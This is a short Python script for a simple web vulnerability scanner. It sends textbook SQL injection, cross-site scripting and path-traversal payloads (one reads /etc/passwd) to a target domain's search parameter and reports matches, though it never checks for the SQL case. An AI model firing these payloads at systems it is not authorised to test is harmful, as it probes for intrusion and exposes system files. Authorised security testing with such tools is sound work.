import requests

VULN_PAYLOADS = {
    "sql": "' OR '1'='1' --",
    "xss": "<script>alert(1)</script>",
    "lfi": "../../../../../etc/passwd"
}

def vuln_scan(domain):
    results = []
    for vuln_type, payload in VULN_PAYLOADS.items():
        try:
            response = requests.get(f"http://{domain}/?search={payload}", timeout=5)
            if "root:x" in response.text or "alert(1)" in response.text:
                results.append(f"[🔥] {vuln_type.upper()} found at: http://{domain}/?search={payload}")
        except requests.exceptions.RequestException:
            pass
    
    if results:
        print("\n[⚠] Running Advanced Vulnerability Scan...")
        for result in results:
            print(result)
    else:
        print("[VULN SCANNER] No vulnerabilities found.")
